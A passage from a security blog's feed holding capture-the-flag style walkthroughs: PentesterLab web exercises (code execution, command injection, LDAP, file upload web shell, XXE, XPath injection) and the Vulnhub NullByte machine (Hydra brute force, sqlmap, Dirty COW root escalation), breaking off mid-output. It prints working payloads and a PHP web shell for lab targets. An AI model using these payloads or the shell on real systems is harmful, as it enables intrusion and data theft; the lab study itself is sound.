<p>To exploit this, first we have to add the modifier to the pattern: <code>pattern=/lamer/e</code>. Then we put our code inside the new parameter: <code>new=phpinfo()</code>. The URL now looks like this: <a href="http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer</a></p>

<p><img class="center" src="/images/pentest/webpentester/phpinfo.png" title="&lsquo;phpinfo&rsquo; &lsquo;phpinfo output&rsquo;" ></p>

<p><strong>Example 4</strong></p>

<p>This one looks like the first example, but with a new addition in the code:</p>

<p><code>php
// ensure name is not empty
assert(trim("'".$_GET['name']."'"));
echo "Hello ".htmlentities($_GET['name']);
</code></p>

<p><a href="https://secure.php.net/manual/ro/function.assert.php">assert</a> checks if the assertions is false, but the most important thing that we need to know is: <strong>if the assertion is given as a string it will be evaluated as PHP code by assert()</strong>.</p>

<p>The assert returns true, because it checks that the name parameter = &lsquo;hacker&rsquo;, which it is. When injecting a single quote, we see this error:</p>

<p><code>plain
Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /var/www/codeexec/example4.php(4) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/codeexec/example4.php on line 4
</code></p>

<p>I used a PHP sandbox to help me with this. Let&rsquo;s imagine that the name parameter is a simple string with the value of hacker:</p>

<p><code>php
$name = 'hacker';
</code></p>

<p>Thanks to the use of trim, assert will see (and try to evaluate) the value of &lsquo;hacker&rsquo;. Knowing this, if I try injecting <code>hacker'.phpinfo().&lsquo;</code>, inside the code I assume it will look like this:</p>

<p><code>php
$name = 'hacker'.phpinfo().'';
</code></p>

<p>With the string concatenation, phpinfo() is displayed, but we also see at the bottom of the page: <code>Hello hacker'.phpinfo().&lsquo;</code>. The assert was successful, and the code was executed.</p>

<h3>Commands injection</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/cmd1.png" title="&lsquo;cmd injection&rsquo; &lsquo;ping&rsquo;" ></p>

<p>It looks like a ping program:</p>

<p><code>php
&lt;?php
  system("ping -c 2 ".$_GET['ip']);
?&gt;
</code></p>

<p>You can chain another command after the ping one by doing this: <code>ip=127.0.0.1;whoami</code>. Below the ping output, you can now see the whoami output, which in this case is www-data</p>

<p><strong>Example 2</strong></p>

<p>This looks the same like the previous one, but let&rsquo;s see the code:</p>

<p>``` php
&lt;?php
  if (!(preg_match(&lsquo;/^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}$/m&rsquo;, $_GET[&lsquo;ip&rsquo;]))) {</p>

<pre><code> die("Invalid IP address");
</code></pre>

<p>  }
  system(&ldquo;ping -c 2 &rdquo;.$_GET[&lsquo;ip&rsquo;]);
?>
```</p>

<p>There is some regex added now to validate that the ip parameter will indeed look like in IP. However, similar to a previous example, the check won&rsquo;t look on further lines. We can use <code>%0a</code> to introduce a new line, and run our command there: <code>ip=127.0.0.1%0Apwd</code>. And the output is:</p>

<p>``` plain
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms</p>

<p>&mdash;&ndash; 127.0.0.1 ping statistics &mdash;&ndash;
2 packets transmitted, 2 received, 0% packet loss, time 999ms
rtt min/avg/max/mdev = 0.012/0.017/0.022/0.005 ms
/var/www/commandexec
```</p>

<p><strong>Example 3</strong></p>

<p>Same-looking URL, and slightly different code:</p>

<p>``` php
&lt;?php
  if (!(preg_match(&lsquo;/^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}$/&rsquo;, $_GET[&lsquo;ip&rsquo;]))) {</p>

<pre><code> header("Location: example3.php?ip=127.0.0.1");
</code></pre>

<p>  }
  system(&ldquo;ping -c 2 &rdquo;.$_GET[&lsquo;ip&rsquo;]);
?>
```</p>

<p>This time, the script will redirect the user if the ip parameter doesn&rsquo;t match the regex. However, the execution will continue, even if the browser gets redirected. To stop the execution altogether, it would be necessary to call the <em>die()</em> function after the <em>header()</em> function, which isn&rsquo;t happening in this case. So we can still inject a command, but we&rsquo;ll need to do it through another medium than the browser, or use a proxy. For this, I used Burp, sent the payload <code>ip=127.0.0.1;ls</code>, and looked inside the 302 response to find what I wanted to see:</p>

<p><code>plain
example1.php
example2.php
example3.php
index.html
</code></p>

<h3>LDAP attacks</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/ldap1.png" title="&lsquo;ldap&rsquo; &lsquo;ldap 1&rsquo;" ></p>

<p>This is a new type of exercise, involving LDAP:</p>

<p>``` php
&lt;?php
  require &ldquo;../header.php&rdquo; ;
  $ld = ldap_connect(&ldquo;localhost&rdquo;) or die(&ldquo;Could not connect to LDAP server&rdquo;);
  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
  ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
  if ($ld) {
   if (isset($_GET[&ldquo;username&rdquo;])) {</p>

<pre><code> $user = "uid=".$_GET["username"]."ou=people,dc=pentesterlab,dc=com";
</code></pre>

<p>   }
   $lb = @ldap_bind($ld, $user,$_GET[&ldquo;password&rdquo;]);</p>

<pre><code>if ($lb) {
   echo "AUTHENTICATED";
}
else {
   echo "NOT AUTHENTICATED";
}
</code></pre>

<p>  }
  require &ldquo;../footer.php&rdquo; ;
?>
```</p>

<p>First, let&rsquo;s learn more about <a href="http://projects.webappsec.org/w/page/13246947/LDAP%20Injection">LDAP</a>:</p>

<blockquote><p>LDAP Injection is an attack technique used to exploit web sites that construct LDAP statements from user-
supplied input.</p>

<p>Lightweight Directory Access Protocol (LDAP) is an open-standard protocol for both querying and
manipulating X.500 directory services. The LDAP protocol runs over Internet transport protocols, such as
TCP. Web applications may use user-supplied input to create custom LDAP statements for dynamic web page
requests.</p>

<p>When a web application fails to properly sanitize user-supplied input, it is possible for an attacker to
alter the construction of an LDAP statement. When an attacker is able to modify an LDAP statement, the
process will run with the same permissions as the component that executed the command. (e.g. Database
server, Web application server, Web server, etc.). This can cause serious security problems where the
permissions grant the rights to query, modify or remove anything inside the LDAP tree. The same advanced
exploitation techniques available in SQL Injection can also be similarly applied in LDAP Injection.</p></blockquote>

<p>This particular example is vulnerable to <a href="https://securitysynapse.blogspot.com/2013/09/dangers-of-ldap-null-base-and-bind.html">NULL bind</a>, where an anonymous user can access information from the LDAP directory without authentication. For this, the values sent to the server have to be null, so instead of just sending empty values, we have to completely remove them:</p>

<p><img class="center" src="/images/pentest/webpentester/ldap1_sol.png" title="&lsquo;ldap 1&rsquo; &lsquo;ldap null&rsquo;" ></p>

<p><strong>Example 2</strong></p>

<p><img class="center" src="/images/pentest/webpentester/ldap2.png" title="&lsquo;ldap&rsquo; &lsquo;ldap 2&rsquo;" ></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php
  require &ldquo;../header.php&rdquo; ;
  $ld = ldap_connect(&ldquo;localhost&rdquo;) or die(&ldquo;Could not connect to LDAP server&rdquo;);
  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
  ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
  if ($ld) {
   $lb = @ldap_bind($ld, &ldquo;cn=admin,dc=pentesterlab,dc=com&rdquo;, &ldquo;pentesterlab&rdquo;);</p>

<pre><code>if ($lb) {
  $pass = "{MD5}".base64_encode(pack("H*",md5($_GET['password'])));
  $filter = "(&amp;(cn=".$_GET['name'].")(userPassword=".$pass."))";
  if (!($search=@ldap_search($ld, "ou=people,dc=pentesterlab,dc=com", $filter))) {
  echo("Unable to search ldap server&lt;br&gt;");
  echo("msg:'".ldap_error($ld)."'&lt;/br&gt;");
} else {
  $number_returned = ldap_count_entries($ld,$search);
  $info = ldap_get_entries($ld, $search);
  if ($info["count"] &lt; 1) {
     //NOK 
     echo "UNAUTHENTICATED";
  }
  else {
    echo "AUTHENTICATED as";
    echo(" ".htmlentities($info[0]['uid'][0]));
  } 
}
</code></pre>

<p>   }
  }
  require &ldquo;../footer.php&rdquo; ;
?>
```</p>

<p>The goal here is to be able to authenticate with any password, and get information from the directory. Now, since the password is being hashed, the only likely place to inject into is the username. To learn more about LDAP, its rules and types of injection, I found a nice <a href="https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf">BlackHat whitepaper</a>. The key takeaway is that the injection will happen in the filter. In our case, the filter is:</p>

<p><code>plain
(&amp;(cn=name)(userPassword=password))
</code></p>

<p>We see here that filter uses <strong>&amp;</strong>, which specifies an AND condition, where both username and password have to be true. Remembering that we can only inject inside the username parameter, here&rsquo;s what we can do:</p>

<p><code>plain
(&amp;(cn=name)(cn=*))%00(userPassword=password))
</code></p>

<p>The ) closes the name filter, then we introduce an always true condition with the * wildcard, the closing ) matches the  one at the beginning of the filter, and the null byte..well, nullifies the rest of the filter.</p>

<p><img class="center" src="/images/pentest/webpentester/ldap2_sol.png" title="&lsquo;ldap 2&rsquo; &lsquo;ldap filter injection&rsquo;" ></p>

<h3>File Upload</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/upload1.png" title="&lsquo;upload1&rsquo; &lsquo;file upload&rsquo;" ></p>

<p>It looks like we can upload an image and find it in the <code>/upload/images/</code> directory:</p>

<p>``` php
&lt;?php
if(isset($<em>FILES[&lsquo;image&rsquo;]))
{
  $dir = &lsquo;/var/www/upload/images/&rsquo;;
  $file = basename($</em>FILES[&lsquo;image&rsquo;][&lsquo;name&rsquo;]);
  if(move_uploaded_file($_FILES[&lsquo;image&rsquo;][&lsquo;tmp_name&rsquo;], $dir. $file))
  {
  echo &ldquo;Upload done&rdquo;;
  echo &ldquo;Your file can be found <a href=\"/upload/images/".htmlentities($file)."\">here</a>&rdquo;;
  }
  else
  {</p>

<pre><code>echo 'Upload failed';
</code></pre>

<p>  }
}
?>
```</p>

<p>Obviously, I am thinking about uploading a PHP shell instead. But first, I wanted to see if there is anything already in the images folder, and I wasn&rsquo;t disappointed:</p>

<p><img class="center" src="/images/pentest/webpentester/hacker.png" title="&lsquo;lol&rsquo; &lsquo;haxxor chat&rsquo;" ></p>

<p>Ok, now it&rsquo;s time for the shell. I created a basic PHP shell:</p>

<p><code>php
&lt;?php
  system($_GET["cmd"]);
?&gt;
</code></p>

<p>Uploaded it, navigated to it and passed a command:</p>

<p><code>plain
http://192.168.217.138/upload/images/ashell.php?cmd=pwd
/var/www/upload/images
</code></p>

<p><strong>Example 2</strong></p>

<p>Same functionality, but this time the script doesn&rsquo;t allow PHP extensions:</p>

<p>``` php
&lt;?php
if(isset($<em>FILES[&lsquo;image&rsquo;]))
{
  $dir = &lsquo;/var/www/upload/images/&rsquo;;
  $file = basename($</em>FILES[&lsquo;image&rsquo;][&lsquo;name&rsquo;]);</p>

<pre><code>if (preg_match('/\.php$/',$file)) {
    DIE("NO PHP");
}
</code></pre>

<p>  if(move_uploaded_file($_FILES[&lsquo;image&rsquo;][&lsquo;tmp_name&rsquo;], $dir . $file))
  {
  echo &lsquo;Upload done !&rsquo;;
  echo &lsquo;Your file can be found <a href="http://chousensha.github.io/upload/images/'.htmlentities($file).'">here</a>&rsquo;;
  }
  else
  {</p>

<pre><code>echo 'Upload failed';
</code></pre>

<p>  }
}
?>
```</p>

<p>The code checks that an extension may not end in php. Uploading a .php file followed by a non-existent extension will cause the server to ignore the unknown extension and switch to the next one it knows. I uploaded the same shell as <code>ashell.php.fail</code>:</p>

<p><code>plain
http://192.168.217.138/upload/images/ashell.php.fail?cmd=ls%20/home
user
</code></p>

<h3>XML attacks</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xml1.png" title="&lsquo;xml1&rsquo; &lsquo;xml 1&rsquo;" ></p>

<p>A twist on the previous challenges, this time with the use of XML:</p>

<p><code>php
Hello  
&lt;?php
  $xml=simplexml_load_string($_GET['xml']);
  print_r((string)$xml);
?&gt;
</code></p>

<p>This particular vulnerability revolves around <a href="https://phpsecurity.readthedocs.io/en/latest/Injection-Attacks.html#xml-injection">XML injection</a>:</p>

<blockquote><p>Custom entities can be defined by including them directly in an optional DOCTYPE and the expanded
value they represent may reference an external resource to be included. It is this capacity of
ordinary XML to carry custom references which can be expanded with the contents of an external
resources that gives rise to an XXE vulnerability.</p></blockquote>

<p>So, I defined the following entity:</p>

<p><code>plain
&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;
</code></p>

<p>This entity can be referenced with <code>&hacker;</code>. Of course, we will need to URL encode it. Here&rsquo;s the URL with the XML injection:</p>

<p><code>plain
192.168.217.138/xml/example1.php?xml=&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;&lt;test&gt;%26hacker%3B&lt;/test&gt;
</code></p>

<p><img class="center" src="/images/pentest/webpentester/xml1_inj.png" title="&lsquo;xml1&rsquo; &lsquo;xml injection&rsquo;" ></p>

<p><strong>Example 2</strong></p>

<p>Another hello page, but the URL is a bit different: <a href="http://192.168.217.138/xml/example2.php?name=hacker">http://192.168.217.138/xml/example2.php?name=hacker</a></p>

<p>``` php
  $x = &ldquo;<data><users><user><name>hacker</name><message>Hello hacker</message><password>pentesterlab</password></user><user><name>admin</name><message>Hello admin</message><password>s3cr3tP4ssw0rd</password></user></users></data>&rdquo;;</p>

<p>  $xml=simplexml_load_string($x);
  $xpath = &ldquo;users/user/name[.=&lsquo;&rdquo;.$_GET['name&rsquo;].&ldquo;&lsquo;]/parent::*/message&rdquo;;
  $res = ($xml->xpath($xpath));
  while(list( ,$node) = each($res)) {</p>

<pre><code>echo $node;
</code></pre>

<p>  }
```</p>

<p>We see here some XML data containing users and passwords, and user input being used to construct an <a href="https://www.w3schools.com/xml/xml_xpath.asp">XPATH</a> query. XPATH is used to navigate through elements and attributes in an XML document.</p>

<p>With a name of hacker, the XPATH would look like this:</p>

<p><code>plain
users/user/name[.='hacker']/parent::*/message
</code></p>

<p><a href="https://www.owasp.org/index.php/XPATH_Injection">XPATH injection</a> is similar to SQL injection. Here we can inject inside the name input to create an always true condition and get rid of the remaining query as follows: <code>hacker' or 1=1]%00</code>. Now the query looks like this:</p>

<p><code>plain
users/user/name[.='hacker' or 1=1]%00']/parent::*/message
</code></p>

<p><img class="center" src="/images/pentest/webpentester/xml2.png" title="&lsquo;xml2&rsquo; &lsquo;xpath injection&rsquo;" ></p>

<p>Wow, this was a really fun challenge, and I hadn&rsquo;t done a web app challenge in a while! Many thanks to PentesterLab for this challenge and their help when I had questions! They also have their own course for the challenge <a href="https://pentesterlab.com/exercises/web_for_pentester/course">here</a></p>

<p>Until next time, straight from the cow&rsquo;s mouth:</p>

<p>``` plain
/ You are fighting for survival in your \
\ own sweet and gentle way.             /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - NullByte]]></title>
    <link href="http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte/"/>
    <updated>2017-04-18T11:00:06-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte</id>
    <content type="html"><![CDATA[<p>Today I&rsquo;m back with another vulnerable machine from Vulnhub! It&rsquo;s' been a while since I&rsquo;ve done one, and I was getting restless :D The target for today is called NullByte, and the goal is to read /root/proof.txt</p>

<!-- more -->


<p>I am going to use alternate tools to accomplish the enumeration tasks, instead of the usual Nmap ping scan. To identify the machine on the network, I&rsquo;ll go with <strong>netdiscover</strong> this time:</p>

<p>``` plain
netdiscover -r 192.168.217.0/24</p>

<p> Currently scanning: Finished!   |   Screen View: Unique Hosts</p>

<p> 29 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1740</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> &hellip;          <br/>
 192.168.217.135 00:0c:29:57:bc:ff      4     240  Unknown vendor            <br/>
 &hellip;<br/>
```</p>

<p>By correlating the VMware MAC address with the one in the scan, I know the IP of the target is 192.168.217.135. Next, I port scanned the target:</p>

<p>``` plain
nmap -T4 -p- -sV 192.168.217.135</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-04-18 11:51 EDT
Nmap scan report for 192.168.217.135
Host is up, received arp-response (0.00016s latency).
Not shown: 65531 closed ports
Some closed ports may be reported as filtered due to &mdash;defeat-rst-ratelimit
Reason: 65531 resets
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
777/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
53755/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
```</p>

<p>Hmm, SSH on port 777? Oh well, let&rsquo;s look at the web server first:</p>

<p><img class="center" src="/images/pentest/nullbyte/web.png" title="&lsquo;nullbyte web&rsquo; &lsquo;nullbyte web page&rsquo;" ></p>

<p>Just an image, nothing in the source, no robots.txt. I needed to see if there are any other interesting directories, but instead of Dirbuster, I used TheColonial&rsquo;s <a href="https://github.com/OJ/gobuster">Gobuster</a>, which is a CLI tool written in Go:</p>

<p>``` plain
gobuster -u <a href="http://192.168.217.135/">http://192.168.217.135/</a> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>

<h1>Gobuster v1.2                OJ Reeves (@TheColonial)</h1>

<p>[+] Mode         : dir
[+] Url/Domain   : <a href="http://192.168.217.135/">http://192.168.217.135/</a>
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>

<h1>[+] Status codes : 200,204,301,302,307</h1>

<p>/uploads (Status: 301)
/javascript (Status: 301)</p>

<h1>/phpmyadmin (Status: 301)</h1>

<p>```</p>

<p>Unfortunately, nothing in there either. The only thing that we have so far is an image. Let&rsquo;s hope there is no (or very rudimentary) steganography involved. I looked at the metadata of the image:</p>

<p><code>plain
exiftool main.gif
ExifTool Version Number         : 10.40
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2017:04:18 12:24:59-04:00
File Access Date/Time           : 2017:04:18 12:24:59-04:00
File Inode Change Date/Time     : 2017:04:18 12:24:59-04:00
File Permissions                : rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
</code></p>

<p>Hello there, conspicuous comment section! On a hunch, I tried navigating to a folder with that name on the web server, and finally seeing something promising:</p>

<p><img class="center" src="/images/pentest/nullbyte/key.png" title="&lsquo;key&rsquo; &lsquo;key form&rsquo;" ></p>

<p>And in the source, there is a comment stating that &ldquo;this form isn&rsquo;t connected to mysql, password ain&rsquo;t that complex&rdquo;. Ok, so no SQLi then. I took the hint and set to brute forcing the password. I used Hydra for this, so I had to take note of the form parameters:</p>

<p>``` html</p>

<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form>
</center>


<p>```</p>

<p>Also, trying the wrong key gives the message invalid key. Armed with this info, I constructed the Hydra query:</p>

<p><code>plain
hydra 192.168.217.135 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l meh -P /usr/share/dict/words -t 10 -w 10
</code>
This looks ugly, so let me break it into pieces:</p>

<ul>
<li><p>192.168.217.135 = target name</p></li>
<li><p>http-form-post = the method used</p></li>
<li><p>&ldquo;/kzMb5nVYJw/index.php&rdquo; = URL</p></li>
<li><p>key=^PASS^:invalid key" = the form parameter is called key, the PASS variable will be replaced with passwords from the password file, and Hydra will see as successful a response that doesn&rsquo;t contain the string &ldquo;invalid key&rdquo;</p></li>
<li><p>-l meh = you have to specify a username for Hydra to work, even though in this case there was no user, so I put something random</p></li>
<li><p>-P /usr/share/dict/words = password File</p></li>
<li><p>-t 10 = number of Threads</p></li>
<li><p>-w 10 = timeout value</p></li>
</ul>


<p>``` plain
Hydra v8.3 &copy; 2016 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-04-18 13:11:54
[DATA] max 10 tasks per 1 server, overall 64 tasks, 99171 login tries (l:1/p:99171), ~154 tries per task
[DATA] attacking service http-post-form on port 80
[STATUS] 1170.00 tries/min, 1170 tries in 00:01h, 98001 to do in 01:24h, 10 active
[STATUS] 1173.33 tries/min, 3520 tries in 00:03h, 95651 to do in 01:22h, 10 active
[STATUS] 1173.86 tries/min, 8217 tries in 00:07h, 90954 to do in 01:18h, 10 active
[STATUS] 1174.00 tries/min, 17610 tries in 00:15h, 81561 to do in 01:10h, 10 active
[STATUS] 1174.32 tries/min, 36404 tries in 00:31h, 62767 to do in 00:54h, 10 active
[80][http-post-form] host: 192.168.217.135   login: meh   password: elite
1 of 1 target successfully completed, 1 valid password found
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2017-04-18 13:45:57
```</p>

<p>We can see that Hydra found the password: elite ! Inputting it takes us to another form:</p>

<p><img class="center" src="/images/pentest/nullbyte/username.png" title="&lsquo;username&rsquo; &lsquo;search username&rsquo;" ></p>

<p>Whatever I entered into the form, I got the message &ldquo;Fetched data successfully&rdquo;. I looked at the source code and found another page to check:</p>

<p>``` html</p>

<p>Search for usernames: </p>


<hr>


<p><form action="420search.php" method="get">
Enter username:<br>
<input type="text" name="usrtosearch">
</form>
```</p>

<p>Navigating to 420search.php revealed 2 usernames:</p>

<p>``` plain
EMP ID :1
EMP NAME : ramses</p>

<h2>EMP POSITION :</h2>

<p>EMP ID :2
EMP NAME : isis</p>

<h2>EMP POSITION : employee</h2>

<p>Fetched data successfully
```
I pointed sqlmap to the usrtosearch parameter and was able to pull data from the DB:</p>

<p><code>plain
sqlmap -u "http://192.168.217.135/kzMb5nVYJw/420search.php?usrtosearch=isis" -p usrtosearch --dbms=MySQL --tables
...
[04:24:25] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, phpmyadmin, seth'
...
Database: seth
[1 table]
+----------------------------------------------+
| users                                        |
+----------------------------------------------+
...
</code></p>

<p>Next I enumerated the users table in the seth DB, and I got a password for ramses:</p>

<p><img class="center" src="/images/pentest/nullbyte/users.png" title="&lsquo;users&rsquo; &lsquo;users csv&rsquo;" ></p>

<p>I went back to that unconventional SSH port and tried to log in as ramses with the password: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE . When that didn&rsquo;t work, I fed it to Google and the first MD5 decoder that popped decrypted it as <code>omega</code></p>

<p>``` plain
ssh -p 777 <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x72;&#97;&#109;&#x73;&#101;&#115;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#50;&#x31;&#x37;&#46;&#x31;&#51;&#53;">&#114;&#x61;&#x6d;&#115;&#x65;&#115;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x32;&#x31;&#x37;&#46;&#x31;&#51;&#53;</a>
<a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#x72;&#x61;&#109;&#115;&#101;&#115;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#50;&#x31;&#55;&#x2e;&#49;&#51;&#53;">&#114;&#97;&#109;&#115;&#x65;&#x73;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x32;&#x31;&#55;&#46;&#49;&#x33;&#53;</a>&rsquo;s password:</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
ramses@NullByte:~$
```</p>

<p>Time to look around the system!</p>

<p><code>plain
ls -l /home
total 12
drwxr-xr-x 2 bob    bob    4096 Aug  2  2015 bob
drwxr-xr-x 2 eric   eric   4096 Aug  2  2015 eric
drwxr-xr-x 2 ramses ramses 4096 Aug  2  2015 ramses
</code></p>

<p>Nothing interesting in those home directories. I looked at the kernel version next:</p>

<p>``` plain
uname -v</p>

<h1>1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17)</h1>

<p>```</p>

<p>A bit of google-fu revealed that this kernel is vulnerable to CVE-2016-5195, or more popularly known as the <a href="https://www.exploit-db.com/exploits/40616/">Dirty Cow exploit</a> . It is possible to exploit a race condition to escalate privileges to root! I downloaded the source code to the NullByte VM, commented out the x64 payload and uncommented the x86 one, and then I compiled it with <code>gcc dirtycow.c -o dirtycow -pthread</code>. I got some warnings, but was able to run it successfully:</p>

<p><code>plain
./dirtycow
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 53112
Racing, this may take a while..
thread stopped
/usr/bin/passwd is overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
root@NullByte:/home/ramses# whoami
root
</code></p>

<p>The system crashed shortly afterwards, so I followed the advice in the exploit source code and did <code>echo 0 > /proc/sys/vm/dirty_writeback_centisecs</code>, and it didn&rsquo;t crash anymore. With this, I was able to read the flag:</p>

<p>``` plain
cat /root/proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d</p>

<p>It seems that you have pwned the box, congrats.
Now you done that I wanna talk with you. Write a walk &amp; mail at
<a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#120;&#108;&#121;&#48;&#110;&#64;&#x73;&#x69;&#x67;&#x61;&#105;&#110;&#116;&#46;&#x6f;&#x72;&#x67;">&#120;&#108;&#x79;&#48;&#x6e;&#x40;&#115;&#105;&#103;&#x61;&#x69;&#x6e;&#116;&#x2e;&#x6f;&#114;&#103;</a> attach the walk and proof.txt
If sigaint.org is down you may mail at <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#110;&#98;&#x73;&#108;&#x79;&#x30;&#x6e;&#x40;&#x67;&#x6d;&#x61;&#105;&#108;&#x2e;&#x63;&#111;&#109;">&#110;&#x62;&#x73;&#x6c;&#x79;&#x30;&#x6e;&#x40;&#103;&#109;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;</a></p>

<p>USE THIS PGP PUBLIC KEY</p>

<p>&mdash;&mdash;-BEGIN PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
Version: BCPG C# v1.6.1.0</p>

<p>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
&mdash;&mdash;-END PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
```</p>

<p>After completing this and looking at other walkthroughs to see alternate ways of exploitation, I realized that I completely missed the way this VM was supposed to be exploited, so below is the intended way of solving this:</p>

<p>Inside ramses' home folder is a <strong>.bash_history</strong> file that I neglected reading:</p>

<p><code>plain
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch
clear
sudo -s
cd /
ls
exit
</code></p>

<p>An interesting path and binary. Let&rsquo;s see it on the filesystem:</p>

<p><code>plain
ls -l /var/www/backup
total 12
-rwsr-xr-x 1 root root 4932 Aug  2  2015 procwatch
-rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
cat readme.txt
I have to fix this mess...
</code></p>

<p>A SUID executable and a comment alluding to a mess..hmm, what could go wrong here..</p>

<p><code>plain
./procwatch
  PID TTY          TIME CMD
 1535 pts/0    00:00:00 procwatch
 1536 pts/0    00:00:00 sh
 1537 pts/0    00:00:00 ps
</code></p>

<p>This looks like the output of the <strong>ps</strong> command. Let&rsquo;s see a normal ps:</p>

<p><code>plain
ps
  PID TTY          TIME CMD
